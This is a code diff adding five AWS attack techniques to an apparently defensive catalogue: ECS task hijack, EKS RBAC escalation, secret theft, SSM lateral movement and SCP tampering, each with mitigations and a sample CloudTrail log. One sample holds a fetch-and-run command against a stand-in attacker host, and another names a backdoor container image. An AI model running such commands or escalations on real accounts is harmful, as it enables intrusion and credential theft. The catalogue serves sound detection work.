@@ -493,6 +493,175 @@ export const techniques: Technique[] = [
   }
 }`,
   },
+  {
+    id: "tech-ecs-task-hijack",
+    name: "ECS Task Definition Modification",
+    shortName: "ECS Hijack",
+    description:
+      "Register a new ECS task definition revision with a malicious container image or modified entrypoint. When the service deploys, the attacker's code runs with the task role's permissions.",
+    services: ["ECS", "IAM"],
+    permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
+    detectionIds: ["det-027"],
+    mitigations: [
+      "Restrict RegisterTaskDefinition to CI/CD pipelines only",
+      "Use image signing and verification (e.g., Sigstore/Cosign)",
+      "Audit task definition revisions regularly",
+    ],
+    category: "privilege-escalation",
+    cloudtrailSample: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/DevRole/attacker"
+  },
+  "eventTime": "2024-04-10T09:15:22Z",
+  "eventSource": "ecs.amazonaws.com",
+  "eventName": "RegisterTaskDefinition",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "family": "web-app",
+    "containerDefinitions": [{
+      "name": "app",
+      "image": "attacker-registry.io/backdoor:latest",
+      "essential": true
+    }],
+    "taskRoleArn": "arn:aws:iam::123456789012:role/ECSTaskAdminRole"
+  }
+}`,
+  },
+  {
+    id: "tech-eks-rbac-abuse",
+    name: "EKS RBAC Privilege Escalation",
+    shortName: "EKS RBAC",
+    description:
+      "Abuse Kubernetes RBAC in EKS to escalate privileges by creating ClusterRoleBindings or modifying existing roles to grant cluster-admin access to an attacker-controlled service account.",
+    services: ["EKS", "IAM"],
+    permissions: ["eks:AccessKubernetesApi"],
+    detectionIds: ["det-025", "det-026"],
+    mitigations: [
+      "Use aws-auth ConfigMap with least-privilege mappings",
+      "Enable EKS audit logging to CloudWatch",
+      "Restrict cluster-admin bindings via OPA/Gatekeeper",
+    ],
+    category: "privilege-escalation",
+    cloudtrailSample: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/EKSDevRole/attacker"
+  },
+  "eventTime": "2024-04-10T10:30:44Z",
+  "eventSource": "eks.amazonaws.com",
+  "eventName": "AccessKubernetesApi",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "clusterName": "prod-cluster",
+    "uri": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+    "verb": "create"
+  }
+}`,
+  },
+  {
+    id: "tech-secrets-manager-theft",
+    name: "Secrets Manager Secret Extraction",
+    shortName: "Secrets Theft",
+    description:
+      "Retrieve secrets from AWS Secrets Manager using GetSecretValue. Attackers target database credentials, API keys, and tokens stored as secrets after gaining IAM access.",
+    services: ["Secrets Manager", "IAM"],
+    permissions: ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
+    detectionIds: ["det-028"],
+    mitigations: [
+      "Use resource-based policies to restrict secret access",
+      "Enable Secrets Manager audit logging",
+      "Rotate secrets automatically on a schedule",
+    ],
+    category: "credential-access",
+    cloudtrailSample: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
+  },
+  "eventTime": "2024-04-10T11:05:33Z",
+  "eventSource": "secretsmanager.amazonaws.com",
+  "eventName": "GetSecretValue",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "secretId": "prod/database/admin-credentials"
+  },
+  "responseElements": null
+}`,
+  },
+  {
+    id: "tech-ssm-command-execution",
+    name: "SSM Run Command Lateral Movement",
+    shortName: "SSM RunCmd",
+    description:
+      "Use AWS Systems Manager Run Command to execute arbitrary commands on EC2 instances. This allows lateral movement across instances without SSH access or security group changes.",
+    services: ["SSM", "EC2", "IAM"],
+    permissions: ["ssm:SendCommand", "ssm:StartSession"],
+    detectionIds: ["det-029"],
+    mitigations: [
+      "Restrict ssm:SendCommand to specific document names",
+      "Use SSM Session Manager logging to S3/CloudWatch",
+      "Implement approval workflows for Run Command",
+    ],
+    category: "lateral-movement",
+    cloudtrailSample: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "AssumedRole",
+    "arn": "arn:aws:sts::123456789012:assumed-role/CompromisedRole/session"
+  },
+  "eventTime": "2024-04-10T12:20:15Z",
+  "eventSource": "ssm.amazonaws.com",
+  "eventName": "SendCommand",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "documentName": "AWS-RunShellScript",
+    "instanceIds": ["i-0abc123def456"],
+    "parameters": {
+      "commands": ["curl http://attacker.com/payload.sh | bash"]
+    }
+  }
+}`,
+  },
+  {
+    id: "tech-org-scp-bypass",
+    name: "Organizations SCP Modification",
+    shortName: "SCP Bypass",
+    description:
+      "Modify or detach Service Control Policies (SCPs) in AWS Organizations to remove security guardrails. This enables previously blocked actions across all accounts in the organization.",
+    services: ["Organizations", "IAM"],
+    permissions: ["organizations:DetachPolicy", "organizations:UpdatePolicy", "organizations:DeletePolicy"],
+    detectionIds: ["det-030"],
+    mitigations: [
+      "Use a dedicated management account with strict MFA",
+      "Alert on any SCP modifications immediately",
+      "Implement break-glass procedures for SCP changes",
+    ],
+    category: "defense-evasion",
+    cloudtrailSample: `{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "IAMUser",
+    "arn": "arn:aws:iam::111111111111:user/mgmt-admin"
+  },
+  "eventTime": "2024-04-10T13:45:01Z",
+  "eventSource": "organizations.amazonaws.com",
+  "eventName": "DetachPolicy",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "requestParameters": {
+    "policyId": "p-abcdef1234",
+    "targetId": "ou-root-prodaccounts"
+  }
+}`,
+  },
 ];
 
 // ─── Lookup helpers ───
